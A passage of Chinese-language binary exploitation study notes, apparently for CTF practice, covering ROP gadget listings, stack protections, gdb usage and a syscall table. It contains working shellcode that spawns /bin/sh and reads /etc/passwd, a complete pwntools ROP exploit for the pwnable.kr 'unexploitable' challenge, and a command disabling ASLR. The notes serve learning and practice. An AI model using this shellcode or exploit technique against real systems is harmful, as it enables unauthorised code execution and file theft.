0x0000000000000661 : je 0x673 ; pop rbp ; jmp rax
0x00000000000006b2 : je 0x6c3 ; pop rbp ; jmp rax
0x0000000000000664 : jmp rax
0x00000000000006b5 : jmp rax
0x000000000000078a : leave ; ret
0x00000000000006f8 : mov byte ptr [rip + 0x200911], 1 ; pop rbp ; ret
0x0000000000000785 : mov eax, 0 ; leave ; ret
0x00000000000007d7 : mov edi, ebp ; call qword ptr [r12 + rbx*8]
0x00000000000007d6 : mov edi, r13d ; call qword ptr [r12 + rbx*8]
0x0000000000000668 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x00000000000006b8 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x00000000000007f8 : nop dword ptr [rax + rax] ; ret
0x0000000000000701 : nop dword ptr [rax] ; ret
0x00000000000006b3 : or al, 0x5d ; jmp rax
0x00000000000006fb : or dword ptr [rax], esp ; add byte ptr [rcx], al ; pop rbp ; ret
0x00000000000007d8 : out dx, eax ; call qword ptr [r12 + rbx*8]
0x00000000000007ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000000007ee : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000000007f0 : pop r14 ; pop r15 ; ret
0x00000000000007f2 : pop r15 ; ret
0x0000000000000663 : pop rbp ; jmp rax
0x00000000000006b4 : pop rbp ; jmp rax
0x00000000000007eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000000007ef : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000000670 : pop rbp ; ret
0x00000000000006c0 : pop rbp ; ret
0x00000000000006ff : pop rbp ; ret
0x00000000000007f3 : pop rdi ; ret
0x00000000000007f1 : pop rsi ; pop r15 ; ret
0x00000000000007ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000000005a6 : ret
0x0000000000000671 : ret
0x00000000000006c1 : ret
0x0000000000000700 : ret
0x0000000000000709 : ret
0x0000000000000708 : ret
0x000000000000078b : ret
0x00000000000007df : ret
0x00000000000007f4 : ret
0x0000000000000801 : ret
0x0000000000000800 : ret
0x000000000000080c : ret
0x000000000000059d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x0000000000000805 : sub esp, 8 ; add rsp, 8 ; ret
0x0000000000000804 : sub rsp, 8 ; add rsp, 8 ; ret
0x000000000000066a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00000000000006ba : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00000000000007fa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000000059c : test eax, eax ; je 0x5a6 ; call rax
0x000000000000065f : test eax, eax ; je 0x675 ; pop rbp ; jmp rax
0x00000000000006b0 : test eax, eax ; je 0x6c5 ; pop rbp ; jmp rax
0x000000000000059b : test rax, rax ; je 0x5a7 ; call rax
0x000000000000065e : test rax, rax ; je 0x676 ; pop rbp ; jmp rax
0x00000000000006af : test rax, rax ; je 0x6c6 ; pop rbp ; jmp rax

Unique gadgets found: 85
tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all | grep "pop rdi ; ret"
0x00000000000007f3 : pop rdi ; ret
```
## 32位shellcode

```
\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```

## 64位shellcode



## shellcode编写

读取/etc/passwd

```
BITS 64 
; Author Mr.Un1k0d3r - RingZer0 Team 
; Read /etc/passwd Linux x86_64 Shellcode 
; Shellcode size 82 bytes 
global _start 
section .text 
_start: 
    jmp _push_filename 

_readfile: 
    ; syscall open file 
    pop rdi   ; pop path value 
    ; NULL byte fix 
    xor byte [rdi + 11], 0x41 

    xor rax, rax 
    add al, 2 
    xor rsi, rsi  ; set O_RDONLY flag 
    syscall 

    ; syscall read file 
    sub sp, 0xfff 
    lea rsi, [rsp] 
    mov rdi, rax 
    xor rdx, rdx 
    mov dx, 0xfff   ; size to read 
    xor rax, rax 
    syscall 

    ; syscall write to stdout 
    xor rdi, rdi 
    add dil, 1 ; set stdout fd = 1 
    mov rdx, rax 
    xor rax, rax 
    add al, 1 
    syscall 

    ; syscall exit 
    xor rax, rax 
    add al, 60 
    syscall 

_push_filename: 
    call _readfile 
    path: db "/etc/passwdA" 
```

```
$ nasm -f elf64 readfile.asm -o readfile.o 
$ for i in $(objdump  -d readfile.o | grep "^ " | cut  -f2); do echo  -n  '\x'$i; done; echo 
\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x6 
6\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x 
0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\ 
xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f 
\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41 
```

execve /bin/sh

```
.global _start
_start:
    xor %esi, %esi
    # /bin//sh
    movabs $0x68732f2f6e69622f, %rbx
    push %rsi
    push %rbx
    push %rsp
    pop %rdi
    pushq $59
    pop %rax
    xor %edx, %edx
    syscall
```

```\
tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ vim sh.s
tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ as sh.s -o sh.s.o
tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ld sh.s.o -o sh
tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ./sh
$ asd
sh: 1: asd: not found
tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ for i in $(objdump -d sh | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05
```
## retn和leave和call

retn: 

> 64位: pop rip;  rsp = rsp + 8
>
> 32位: pop eip; esp = esp + 4
>
> retn N操作：先eip=[esp]，然后esp=esp+4+N

leave:

> 64位: move rsp rbp; pop rbp               将rbp中的值传给rsp
>
> 32位: move esp ebp; pop ebp             将ebp中的值传给esp

call:

> 64位: push rip; jump 目的位置
>
> 32位: push eip; jump 目的位置

## 32位寻找偏移

> pattern_create 50
>
> pattern_offset 字符串

## 有符号整数比较和无符号整数比较

| 指令 | 含义                                     | 运算符号 |
| ---- | ---------------------------------------- | -------- |
| jbe  | unsigned below or equal (lower or same)  | <=       |
| jae  | unsigned above or equal (higher or same) | >=       |
| jb   | unsigned below (lower)                   | <        |
| ja   | unsigned above (higher)                  | >        |
| jle  | signed less or equal                     | <=       |
| jge  | signed greater or equal                  | >=       |
| jl   | signed less than                         | <        |
| jg   | signed greater than                      | >        |

从上面的表中可以看出，

对于无符号（unsigned）整数比较，使用的是单词是above或below；
对于有符号(signed)整数比较，则使用的单词是greater或less。

## 查找argv[0]变量的地址

```
gdb-peda$ find /home
Searching for '/home' in: None ranges
Found 6 results, display max 6 items:
[stack] : 0x7fffffffdff6 ("/home/tianji/Desktop/pwn/jarvis/smashes/smashes")
[stack] : 0x7fffffffe8f4 ("/home/tianji/Desktop/pwn/jarvis")
[stack] : 0x7fffffffeb12 ("/home/tianji/Desktop/pwn/jarvis/smashes")
[stack] : 0x7fffffffeb48 ("/home/tianji")
[stack] : 0x7fffffffeee7 ("/home/tianji/.vimpkg/bin")
[stack] : 0x7fffffffefc8 ("/home/tianji/Desktop/pwn/jarvis/smashes/smashes")
gdb-peda$ find 0x7fffffffdff6
Searching for '0x7fffffffdff6' in: None ranges
Found 2 results, display max 2 items:
   libc : 0x7ffff7dd0508 --> 0x7fffffffdff6 ("/home/tianji/Desktop/pwn/jarvis/smashes/smashes")
[stack] : 0x7fffffffdc68 --> 0x7fffffffdff6 ("/home/tianji/Desktop/pwn/jarvis/smashes/smashes")
gdb-peda$ distance $rsp 0x7fffffffdc68
From 0x7fffffffda50 to 0x7fffffffdc68: 536 bytes, 134 dwords
```

首先搜索字符串"/home",第一个地址是真实地址，在搜索指向该地址的指针，该指针也就是我们要找的argv[0]的地址。

当前$rsp的值就是 存在栈溢出变量的地址

## ubuntu 16  64位默认加载地址

运行程序，然后查看 /proc/pid/maps 或者在gdb里边使用 `vmmap`命令。

## ida调试elf文件

在linux中运行 `linux_server`或者`linux_server64`。

然后设置`ida`。

## checksec检测到的保护机制

1. cannary  (栈保护)

   栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。 

   gcc选项: 

   * gcc4.2版本-fstack-protector和-fstack-protector-all编译参数开启栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。 
   * -fno-stack-protector 不开启栈保护 

   > gcc -fno-stack-protector -o test test.c  //禁用栈保护 
   >
   > gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 
   >
   > gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 

2. fortify

   它其实和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。由于并不是太常见，也没有太多的了解。

3. NX(windows下叫 DEP)

   NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 

   gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。 

4. PIE(windows下ASLR)（address space layout randomization）

   一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。 

   > 0 - 表示关闭进程地址空间随机化。 
   >
   > 1 - 表示将mmap的基址，stack和vdso页面随机化。 
   >
   > 2 - 表示在1的基础上增加栈（heap）的随机化。 

   可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。

   Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。

   liunx下关闭PIE的命令如下：

   > sudo -s echo 0 > /proc/sys/kernel/randomize_va_space 

5. RELPO

   设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。 

## gdb中print和x的区别

print 就是打印变量（参数是什么，就打印什么），x但因给定变量代表的内存地址里的值（x后边的参数是地址值，打印的是地址所在内存单元的值）。比如:

> p/x *$rax                                     ; \$1=0x41414141 
>
> x/x $rax                                       ;\$2=0x41

差不多，区别在于打印出来的字节多少而已。

## read和gets和fgets和scanf和getchar和aspfintf

* gets: `char * gets(char *s)`

读取一个字符串到s指向的内存空间，直到出现换行符读到文件尾为止,最后将换行符替换为NULL做作为字符串结束。**注意，由于gets()函数无法知道读取字符串大小，因此容易出现缓冲区溢出,建议使用fgets替代**

* fgets: `char *  fgets(char * s, int n,FILE *stream);`

 参数; 

* s: 字符型指针，指向存储读入数据的缓冲区的地址。
* n: 从流中读入n-1个字符
* stream ： 指向读取的流。

该函数读入n-1个字符或者读到"\n"，然后在最后**添加\x00**

fgets函数会开辟一个堆块，作为缓冲区，大小视情况而定，比如：

```
#include <stdio.h>
 
int main() {
   char s[20];
   fgets(s, 24, stdin);
   printf("%s\n", s);
   fgets(s, 24, stdin);
   printf("%s", s);
   return 0;
}
```

第一次输入`23 * 'a' + 'b' + 22 \* 'b'`，字符串首先会被读到位于堆中的缓冲区里边，再从缓冲区读取到s所在地址，该字符串超过23个字节，所以第二次执行fgets的时候，将不在需要用户输入，直接从第24位开始读取。

```
qianfa@qianfa:~/Desktop/huwangbei$ ./test 
aaaaaaaaaaaaaaaaaaaaaaabaaaaaaaaaaaaaaaaaaaaaa 
aaaaaaaaaaaaaaaaaaaaaaa
baaaaaaaaaaaaaaaaaaaaaa
```

* read: `ssize_t read(int fd, void *buf, size_t count);`

读取cout个字符。直接从流中读取count个字节到buf中。一般不会出现off_by_one

* strcpy

会复制'\x00',可能导致off_by_one

* scanf: 

char s[20]; scanf("%20s", s); scanf遇到**空格**，不满20位，“\t”, "\n"等会停止，添加"\x00"，如果输入大于或者等于20,那么会使得s[20] = "\x00"，也就是存在off_by_one。该函数在输入的数据过长时，比如0x500,也会开启一个堆块，作为缓冲区,但会立即释放。

* getchar():

getchar 也会开辟一个堆块，作为缓冲区，不会释放。

* asprintf

asprintf()可以说是一个增强版的sprintf(),在不确定字符串的长度时，非常灵活方便，能够根据格式化的字符串长度，以malloc的形式申请足够的内存空间。此外，使用完后，必须通过free()释放空间。不过，这是GNU扩展的C函数库，不是标准C函数库或者POSIX。

## mmap分配问题

当mmap的地址是urandom来的，但是不满足mmap要求时，会随机分配这个地址，申请两块同样大小的mmap内存时，若两次mmap的随机地址都已分配，则会造成两处内存空间相邻。

## 寄存器

AH&AL=AX(accumulator):累加寄存器
BH&BL=BX(base):基址寄存器
CH&CL=CX(count):计数寄存器
DH&DL=DX(data):数据寄存器
SP(Stack Pointer):堆栈指针寄存器
BP(Base Pointer):基址指针寄存器
SI(Source Index):源变址寄存器
DI(Destination Index):目的变址寄存器
IP(Instruction Pointer):指令指针寄存器
CS(Code Segment)代码段寄存器
DS(Data Segment):数据段寄存器
SS(Stack Segment):堆栈段寄存器
ES(Extra Segment):附加段寄存器

32位CPU有4个32位的通用寄存器EAX、EBX、ECX和EDX。对低16位数据的存取，不会影响高16位的数据。这些低16位寄存器分别命名为：AX、BX、CX和DX，它和先前的CPU中的寄存器相一致。

4个16位寄存器又可分割成8个独立的8位寄存器(AX：AH-AL、BX：BH-BL、CX：CH-CL、DX：DH-DL)，每个寄存器都有自己的名称，可独立存取。程序员可利用数据寄存器的这种“可分可合”的特性，灵活地处理字/字节的信。

## glibc中各种bin的划分

64位: fastbins [0x20 ~ 0x80] ，步长 0x10

## 经典ROP gadgets

1. __libc_csu_init方法

```
.text:00000000004005E6                 mov     rbx, [rsp+38h+var_30]
.text:00000000004005EB                 mov     rbp, [rsp+38h+var_28]
.text:00000000004005F0                 mov     r12, [rsp+38h+var_20]
.text:00000000004005F5                 mov     r13, [rsp+38h+var_18]
.text:00000000004005FA                 mov     r14, [rsp+38h+var_10]
.text:00000000004005FF                 mov     r15, [rsp+38h+var_8]
.text:0000000000400604                 add     rsp, 38h
.text:0000000000400608                 retn
```

```
.text:00000000004005D0                 mov     rdx, r15
.text:00000000004005D3                 mov     rsi, r14
.text:00000000004005D6                 mov     edi, r13d
.text:00000000004005D9                 call    qword ptr [r12+rbx*8]
```

2. 一般存在"pop r15;ret" 也就存在"pop rdi;ret;"

pwnable.kr-unexploitable 的exp:

```
from pwn import *

io = process("./unexploitable")
elf = ELF("./unexploitable")
#context.log_level = "debug"

pop_rbp = 0x400512
leave_ret = 0x400576
syscall_addr = 0x400560
bss_addr = 0x601028 + 0x200
sh_addr = 0x601028 + 0x400
# rdi, rsi, rdx, rcx, r8, r9
 
gadget_1 = 0x4005e6
"""
   0x00000000004005e6 <+102>:   mov    rbx,QWORD PTR [rsp+0x8]
   0x00000000004005eb <+107>:   mov    rbp,QWORD PTR [rsp+0x10]
   0x00000000004005f0 <+112>:   mov    r12,QWORD PTR [rsp+0x18]
   0x00000000004005f5 <+117>:   mov    r13,QWORD PTR [rsp+0x20]
   0x00000000004005fa <+122>:   mov    r14,QWORD PTR [rsp+0x28]
   0x00000000004005ff <+127>:   mov    r15,QWORD PTR [rsp+0x30]
   0x0000000000400604 <+132>:   add    rsp,0x38
   0x0000000000400608 <+136>:   ret 
"""
 
gadget_2 = 0x4005d0
"""
   0x00000000004005d0 <+80>:    mov    rdx,r15
   0x00000000004005d3 <+83>:    mov    rsi,r14
   0x00000000004005d6 <+86>:    mov    edi,r13d
   0x00000000004005d9 <+89>:    call   QWORD PTR [r12+rbx*8]
"""
 
def call_function(call_addr, arg1, arg2, arg3):
    payload = ""
    payload += p64(gadget_1)    # => rsp
    payload += "A" * 8
    payload += p64(0)           # => rbx
    payload += p64(1)           # => 1
    payload += p64(call_addr)   # => r12 => call addr
    payload += p64(arg1)        # => r13 => edi => rdi
    payload += p64(arg2)        # => r14 => rsi
    payload += p64(arg3)        # => r15 => rdx
    payload += p64(gadget_2)    # => rsp + 38
    payload += "C" * 0x38
    return payload
    
# use read to set rax as 0x59
payload1 = "A" * 0x10 + p64(bss_addr) # "A" * 0x10 + p64(0) is ok too
payload1 += call_function(elf.got['read'], 0, bss_addr, 0x200)
payload1 += p64(pop_rbp)
payload1 += p64(bss_addr)
payload1 += p64(leave_ret)

payload2 = p64(bss_addr + 0x8)       # p64(0x0)  is ok too
payload2 += call_function(elf.got["read"], 0, sh_addr, 0x200)
payload2 += call_function(sh_addr+0x10, sh_addr, 0, 0)
print len(payload2)
payload3 = "/bin/sh\x00".ljust(0x10, "B")
payload3 += p64(syscall_addr)
payload3 = payload3.ljust(59, "D")

sleep(3)
io.send(payload1)
io.send(payload2)
io.send(payload3)
io.interactive()
```



## 汇编指令大全

| 操作码 | 指令        | 说明                                                         |
| ------ | ----------- | ------------------------------------------------------------ |
| 0F 31  | rdtsc       | 将时间标签计数器读入 EDX:EAX。CPU提供了一个特殊的机器指令rdtsc，使用这条指令可以读出CPU自从启动以来的时钟周期数。其计时精度可以达到纳秒级。 |
|        | movabs      | 操作数如果是内存地址的话，那么这个地址必须是16字节对齐的，否则会产生一般保护性异常导致程序退出。 |
|        | movdqa      | 操作数如果是内存地址的话，那么这个地址必须是16字节对齐的，否则会产生一般保护性异常导致程序退出。 |
|        | movntps     | 操作数如果是内存地址的话，那么这个地址必须是16字节对齐的，否则会产生一般保护性异常导致程序退出。 |
|        | dec reg     | DEC的功能是将reg的值减1,如果reg=0,则将reg置为-1              |
|        | xor op1,op2 | 将两个操作数进行[异或运算]，并将结果存放到操作数1中          |
|        | repe        | repe是一个串操作前缀，它重复串操作指令，每重复一次ECX的值就减一,一直到CX为0或ZF为0时停止。 |
|        | cmpsb       | cmpsb是字符串比较指令，把ESI指向的数据与EDI指向的数一个一个的进行比较 |

## syscall调用方法:

调用好保存在rax中，参数设置方式参照调用约定。

```
  4000b0:	48 31 c0             	xor    %rax,%rax
  4000b3:	ba 00 04 00 00       	mov    $0x400,%edx
  4000b8:	48 89 e6             	mov    %rsp,%rsi
  4000bb:	48 89 c7             	mov    %rax,%rdi
  4000be:	0f 05                	syscall        # 调用read
```

## syscall调用表

| %rax | System call                | %rdi                              | %rsi                                  | %rdx                                  | %r10                                  | %r8                                  | %r9                 |
| ---- | -------------------------- | --------------------------------- | ------------------------------------- | ------------------------------------- | ------------------------------------- | ------------------------------------ | ------------------- |
| 0    | sys_read                   | unsigned int fd                   | char *buf                             | size_t count                          |                                       |                                      |                     |
| 1    | sys_write                  | unsigned int fd                   | const char *buf                       | size_t count                          |                                       |                                      |                     |
| 2    | sys_open                   | const char *filename              | int flags                             | int mode                              |                                       |                                      |                     |
| 3    | sys_close                  | unsigned int fd                   |                                       |                                       |                                       |                                      |                     |
| 4    | sys_stat                   | const char *filename              | struct stat *statbuf                  |                                       |                                       |                                      |                     |
| 5    | sys_fstat                  | unsigned int fd                   | struct stat *statbuf                  |                                       |                                       |                                      |                     |
| 6    | sys_lstat                  | fconst char *filename             | struct stat *statbuf                  |                                       |                                       |                                      |                     |
| 7    | sys_poll                   | struct poll_fd *ufds              | unsigned int nfds                     | long timeout_msecs                    |                                       |                                      |                     |
| 8    | sys_lseek                  | unsigned int fd                   | off_t offset                          | unsigned int origin                   |                                       |                                      |                     |
| 9    | sys_mmap                   | unsigned long addr                | unsigned long len                     | unsigned long prot                    | unsigned long flags                   | unsigned long fd                     | unsigned long off   |
| 10   | sys_mprotect               | unsigned long start               | size_t len                            | unsigned long prot                    |                                       |                                      |                     |
| 11   | sys_munmap                 | unsigned long addr                | size_t len                            |                                       |                                       |                                      |                     |
| 12   | sys_brk                    | unsigned long brk                 |                                       |                                       |                                       |                                      |                     |
| 13   | sys_rt_sigaction           | int sig                           | const struct sigaction *act           | struct sigaction *oact                | size_t sigsetsize                     |                                      |                     |
| 14   | sys_rt_sigprocmask         | int how                           | sigset_t *nset                        | sigset_t *oset                        | size_t sigsetsize                     |                                      |                     |
| 15   | sys_rt_sigreturn           | unsigned long __unused            |                                       |                                       |                                       |                                      |                     |
| 16   | sys_ioctl                  | unsigned int fd                   | unsigned int cmd                      | unsigned long arg                     |                                       |                                      |                     |
| 17   | sys_pread64                | unsigned long fd                  | char *buf                             | size_t count                          | loff_t pos                            |                                      |                     |
| 18   | sys_pwrite64               | unsigned int fd                   | const char *buf                       | size_t count                          | loff_t pos                            |                                      |                     |
| 19   | sys_readv                  | unsigned long fd                  | const struct iovec *vec               | unsigned long vlen                    |                                       |                                      |                     |
| 20   | sys_writev                 | unsigned long fd                  | const struct iovec *vec               | unsigned long vlen                    |                                       |                                      |                     |
| 21   | sys_access                 | const char *filename              | int mode                              |                                       |                                       |                                      |                     |
| 22   | sys_pipe                   | int *filedes                      |                                       |                                       |                                       |                                      |                     |
| 23   | sys_select                 | int n                             | fd_set *inp                           | fd_set *outp                          | fd_set*exp                            | struct timeval *tvp                  |                     |
| 24   | sys_sched_yield            |                                   |                                       |                                       |                                       |                                      |                     |
| 25   | sys_mremap                 | unsigned long addr                | unsigned long old_len                 | unsigned long new_len                 | unsigned long flags                   | unsigned long new_addr               |                     |
| 26   | sys_msync                  | unsigned long start               | size_t len                            | int flags                             |                                       |                                      |                     |
| 27   | sys_mincore                | unsigned long start               | size_t len                            | unsigned char *vec                    |                                       |                                      |                     |
| 28   | sys_madvise                | unsigned long start               | size_t len_in                         | int behavior                          |                                       |                                      |                     |
| 29   | sys_shmget                 | key_t key                         | size_t size                           | int shmflg                            |                                       |                                      |                     |
| 30   | sys_shmat                  | int shmid                         | char *shmaddr                         | int shmflg                            |                                       |                                      |                     |
| 31   | sys_shmctl                 | int shmid                         | int cmd                               | struct shmid_ds *buf                  |                                       |                                      |                     |
| 32   | sys_dup                    | unsigned int fildes               |                                       |                                       |                                       |                                      |                     |
| 33   | sys_dup2                   | unsigned int oldfd                | unsigned int newfd                    |                                       |                                       |                                      |                     |
| 34   | sys_pause                  |                                   |                                       |                                       |                                       |                                      |                     |
| 35   | sys_nanosleep              | struct timespec *rqtp             | struct timespec *rmtp                 |                                       |                                       |                                      |                     |
| 36   | sys_getitimer              | int which                         | struct itimerval *value               |                                       |                                       |                                      |                     |
| 37   | sys_alarm                  | unsigned int seconds              |                                       |                                       |                                       |                                      |                     |
| 38   | sys_setitimer              | int which                         | struct itimerval *value               | struct itimerval *ovalue              |                                       |                                      |                     |
| 39   | sys_getpid                 |                                   |                                       |                                       |                                       |                                      |                     |
| 40   | sys_sendfile               | int out_fd                        | int in_fd                             | off_t *offset                         | size_t count                          |                                      |                     |
| 41   | sys_socket                 | int family                        | int type                              | int protocol                          |                                       |                                      |                     |
| 42   | sys_connect                | int fd                            | struct sockaddr *uservaddr            | int addrlen                           |                                       |                                      |                     |
| 43   | sys_accept                 | int fd                            | struct sockaddr *upeer_sockaddr       | int *upeer_addrlen                    |                                       |                                      |                     |
| 44   | sys_sendto                 | int fd                            | void *buff                            | size_t len                            | unsigned flags                        | struct sockaddr *addr                | int addr_len        |
| 45   | sys_recvfrom               | int fd                            | void *ubuf                            | size_t size                           | unsigned flags                        | struct sockaddr *addr                | int *addr_len       |
| 46   | sys_sendmsg                | int fd                            | struct msghdr *msg                    | unsigned flags                        |                                       |                                      |                     |
| 47   | sys_recvmsg                | int fd                            | struct msghdr *msg                    | unsigned int flags                    |                                       |                                      |                     |
| 48   | sys_shutdown               | int fd                            | int how                               |                                       |                                       |                                      |                     |
| 49   | sys_bind                   | int fd                            | struct sokaddr *umyaddr               | int addrlen                           |                                       |                                      |                     |
| 50   | sys_listen                 | int fd                            | int backlog                           |                                       |                                       |                                      |                     |
| 51   | sys_getsockname            | int fd                            | struct sockaddr *usockaddr            | int *usockaddr_len                    |                                       |                                      |                     |
| 52   | sys_getpeername            | int fd                            | struct sockaddr *usockaddr            | int *usockaddr_len                    |                                       |                                      |                     |
| 53   | sys_socketpair             | int family                        | int type                              | int protocol                          | int *usockvec                         |                                      |                     |
| 54   | sys_setsockopt             | int fd                            | int level                             | int optname                           | char *optval                          | int optlen                           |                     |
| 55   | sys_getsockopt             | int fd                            | int level                             | int optname                           | char *optval                          | int *optlen                          |                     |
| 56   | sys_clone                  | unsigned long clone_flags         | unsigned long newsp                   | void *parent_tid                      | void *child_tid                       |                                      |                     |
| 57   | sys_fork                   |                                   |                                       |                                       |                                       |                                      |                     |
| 58   | sys_vfork                  |                                   |                                       |                                       |                                       |                                      |                     |
| 59   | sys_execve                 | const char *filename              | const char *const argv[]              | const char *const envp[]              |                                       |                                      |                     |
| 60   | sys_exit                   | int error_code                    |                                       |                                       |                                       |                                      |                     |
| 61   | sys_wait4                  | pid_t upid                        | int *stat_addr                        | int options                           | struct rusage *ru                     |                                      |                     |
| 62   | sys_kill                   | pid_t pid                         | int sig                               |                                       |                                       |                                      |                     |
| 63   | sys_uname                  | struct old_utsname *name          |                                       |                                       |                                       |                                      |                     |
| 64   | sys_semget                 | key_t key                         | int nsems                             | int semflg                            |                                       |                                      |                     |
| 65   | sys_semop                  | int semid                         | struct sembuf *tsops                  | unsigned nsops                        |                                       |                                      |                     |
| 66   | sys_semctl                 | int semid                         | int semnum                            | int cmd                               | union semun arg                       |                                      |                     |
| 67   | sys_shmdt                  | char *shmaddr                     |                                       |                                       |                                       |                                      |                     |
| 68   | sys_msgget                 | key_t key                         | int msgflg                            |                                       |                                       |                                      |                     |
| 69   | sys_msgsnd                 | int msqid                         | struct msgbuf *msgp                   | size_t msgsz                          | int msgflg                            |                                      |                     |
| 70   | sys_msgrcv                 | int msqid                         | struct msgbuf *msgp                   | size_t msgsz                          | long msgtyp                           | int msgflg                           |                     |
| 71   | sys_msgctl                 | int msqid                         | int cmd                               | struct msqid_ds *buf                  |                                       |                                      |                     |
| 72   | sys_fcntl                  | unsigned int fd                   | unsigned int cmd                      | unsigned long arg                     |                                       |                                      |                     |
| 73   | sys_flock                  | unsigned int fd                   | unsigned int cmd                      |                                       |                                       |                                      |                     |
| 74   | sys_fsync                  | unsigned int fd                   |                                       |                                       |                                       |                                      |                     |
| 75   | sys_fdatasync              | unsigned int fd                   |                                       |                                       |                                       |                                      |                     |
| 76   | sys_truncate               | const char *path                  | long length                           |                                       |                                       |                                      |                     |
| 77   | sys_ftruncate              | unsigned int fd                   | unsigned long length                  |                                       |                                       |                                      |                     |
| 78   | sys_getdents               | unsigned int fd                   | struct linux_dirent *dirent           | unsigned int count                    |                                       |                                      |                     |
| 79   | sys_getcwd                 | char *buf                         | unsigned long size                    |                                       |                                       |                                      |                     |
| 80   | sys_chdir                  | const char *filename              |                                       |                                       |                                       |                                      |                     |
| 81   | sys_fchdir                 | unsigned int fd                   |                                       |                                       |                                       |                                      |                     |
| 82   | sys_rename                 | const char *oldname               | const char *newname                   |                                       |                                       |                                      |                     |
| 83   | sys_mkdir                  | const char *pathname              | int mode                              |                                       |                                       |                                      |                     |
| 84   | sys_rmdir                  | const char *pathname              |                                       |                                       |                                       |                                      |                     |
| 85   | sys_creat                  | const char *pathname              | int mode                              |                                       |                                       |                                      |                     |
| 86   | sys_link                   | const char *oldname               | const char *newname                   |                                       |                                       |                                      |                     |
| 87   | sys_unlink                 | const char *pathname              |                                       |                                       |                                       |                                      |                     |
| 88   | sys_symlink                | const char *oldname               | const char *newname                   |                                       |                                       |                                      |                     |
| 89   | sys_readlink               | const char *path                  | char *buf                             | int bufsiz                            |                                       |                                      |                     |
| 90   | sys_chmod                  | const char *filename              | mode_t mode                           |                                       |                                       |                                      |                     |
| 91   | sys_fchmod                 | unsigned int fd                   | mode_t mode                           |                                       |                                       |                                      |                     |
| 92   | sys_chown                  | const char *filename              | uid_t user                            | gid_t group                           |                                       |                                      |                     |
| 93   | sys_fchown                 | unsigned int fd                   | uid_t user                            | gid_t group                           |                                       |                                      |                     |
| 94   | sys_lchown                 | const char *filename              | uid_t user                            | gid_t group                           |                                       |                                      |                     |
| 95   | sys_umask                  | int mask                          |                                       |                                       |                                       |                                      |                     |
| 96   | sys_gettimeofday           | struct timeval *tv                | struct timezone *tz                   |                                       |                                       |                                      |                     |
| 97   | sys_getrlimit              | unsigned int resource             | struct rlimit *rlim                   |                                       |                                       |                                      |                     |
| 98   | sys_getrusage              | int who                           | struct rusage *ru                     |                                       |                                       |                                      |                     |
| 99   | sys_sysinfo                | struct sysinfo *info              |                                       |                                       |                                       |                                      |                     |
| 100  | sys_times                  | struct sysinfo *info              |                                       |                                       |                                       |                                      |                     |
| 101  | sys_ptrace                 | long request                      | long pid                              | unsigned long addr                    | unsigned long data                    |                                      |                     |
| 102  | sys_getuid                 |                                   |                                       |                                       |                                       |                                      |                     |
| 103  | sys_syslog                 | int type                          | char *buf                             | int len                               |                                       |                                      |                     |
| 104  | sys_getgid                 |                                   |                                       |                                       |                                       |                                      |                     |
| 105  | sys_setuid                 | uid_t uid                         |                                       |                                       |                                       |                                      |                     |
| 106  | sys_setgid                 | gid_t gid                         |                                       |                                       |                                       |                                      |                     |
